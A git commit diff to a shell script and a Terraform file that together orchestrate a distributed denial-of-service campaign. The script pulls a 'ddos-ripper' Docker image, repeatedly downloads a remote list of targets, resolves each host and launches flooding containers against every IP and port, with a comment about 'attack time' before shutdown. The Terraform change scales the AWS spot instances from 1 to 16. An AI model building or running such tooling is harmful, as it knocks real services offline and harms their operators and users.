8e4e450814b4fbfeaeb1112a17b3ae9e2a2d7605
Pavlo Shalahai <pavel.shalahai@iongroup.com>
2022-03-05 16:28:59 +0200

    Auto check & download links.txt & changed s3

--- loop.sh
+++ loop.sh
@@ -13,48 +13,80 @@ sudo mkswap /swapfile
 sudo swapon /swapfile
 # swop improvement
 
+export WGET_LINK=$3
+export LINKS_FILE="/tmp/links.txt"
+export NEW_LINKS="/tmp/links_new/links.txt"
+export TMP_LINKS="/tmp/links_new/links_tmp.txt"
+[[ -f $NEW_LINKS ]] && rm $NEW_LINKS
+[[ -f $TMP_LINKS ]] && rm $TMP_LINKS
+
 IMAGE="dieputindie/ddos-ripper:latest"
 sudo docker pull $IMAGE
 
-if [ -s /tmp/links.txt ]; then
-    echo "local links provided" && cat /tmp/links.txt
+download_links() {
+    sudo wget -N $WGET_LINK -P /tmp/links_new/ &>/tmp/response
+    if cat /tmp/response | grep -q 'not retrieving'; then
+        echo "no new file downloaded"
+        return 1
+    elif cat /tmp/response | grep -q 'Saving to'; then
+        echo "new file downloaded. Prepearing and Converting"
+        [[ -f $TMP_LINKS ]] && rm $TMP_LINKS
+        sudo cp $NEW_LINKS $TMP_LINKS
+        convert_links_file
+        sudo docker rm -f $(docker ps -q -a) #removing all working containers in case of links.txt refresh and restart loop
+        return 0
+    else
+        echo "Something wrong happened with file downloading. Response is:"
+        cat /tmp/response
+        exit 1
+    fi
+}
+
+convert_links_file() {
+    if file $TMP_LINKS | grep CRLF; then
+        echo "$TMP_LINKS contains CRLF. Converting file"
+        sudo vim $TMP_LINKS -c "set ff=unix" -c ":wq"
+        sudo mv $TMP_LINKS $LINKS_FILE
+    fi
+}
+
+if [ -s $LINKS_FILE ]; then
+    echo "local links provided" && cat $LINKS_FILE
+    convert_links_file
 else
     echo "There is no local links.txt. Downloading"
-    sudo rm /tmp/links.txt
-    sudo wget $3 -P /tmp/
-    cat /tmp/links.txt
+    download_links
 fi
 
-if file /tmp/links.txt | grep CRLF; then
-    echo "/tmp/links.txt contains CRLF. Converting file"
-    sudo vim /tmp/links.txt -c "set ff=unix" -c ":wq"
-fi
-
-while read link; do
-    while [ $(sudo docker ps | wc -l) -gt 3 ]; do
-        sleep 60
-    done
-    echo "current link is $link"
-    HOST=$(echo $link | awk -F ' ' '{print $1}')
-    echo "digging " && sudo dig +short $HOST
-    if [[ $HOST =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-        echo $HOST >/tmp/ips.txt
-    else
-        sudo dig +short $HOST >/tmp/ips.txt
-    fi
-
-    cat /tmp/ips.txt
-    while read ip; do
+while true; do
+    download_links
+    while read link; do
         while [ $(sudo docker ps | wc -l) -gt 3 ]; do
             sleep 60
+            download_links && break 
         done
-        echo "Current target is $ip"
-        THIS_HOSTNAME=$(echo $ip | awk -F ' ' '{print $1}')
-        THIS_PORT=$(echo $link | awk -F ' ' '{print $2}')
-        sudo docker stop -t $1 $(sudo docker run -e THIS_HOSTNAME=$THIS_HOSTNAME -e THIS_PORT=$THIS_PORT -e ENABLE_LOG=$2 -d --stop-signal 2 $IMAGE) &
-        sleep 15
-    done </tmp/ips.txt
+        echo "current link is $link"
+        HOST=$(echo $link | awk -F ' ' '{print $1}')
+        echo "digging " && sudo dig +short $HOST
+        if [[ $HOST =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            echo $HOST >/tmp/ips.txt
+        else
+            sudo dig +short $HOST >/tmp/ips.txt
+        fi
 
-done </tmp/links.txt
+        cat /tmp/ips.txt
+        while read ip; do
+            while [ $(sudo docker ps | wc -l) -gt 3 ]; do
+                sleep 60
+            done
+            echo "Current target is $ip"
+            THIS_HOSTNAME=$(echo $ip | awk -F ' ' '{print $1}')
+            THIS_PORT=$(echo $link | awk -F ' ' '{print $2}')
+            sudo docker stop -t $1 $(sudo docker run -e THIS_HOSTNAME=$THIS_HOSTNAME -e THIS_PORT=$THIS_PORT -e ENABLE_LOG=$2 -d --stop-signal 2 $IMAGE) &
+            sleep 15
+        done </tmp/ips.txt
+
+    done <$LINKS_FILE
+done
 sleep $1 # waiting attack time after last links started, before server shutdown
 sudo shutdown now
--- main.tf
+++ main.tf
@@ -16,7 +16,7 @@ provider "aws" {
 
 resource "aws_spot_instance_request" "app_server" {
   ami                    = "ami-02333d201cff78886"
-  count                  = 1
+  count                  = 16
   instance_type          = "t3.medium"
   spot_price             = 0.1
   wait_for_fulfillment   = true
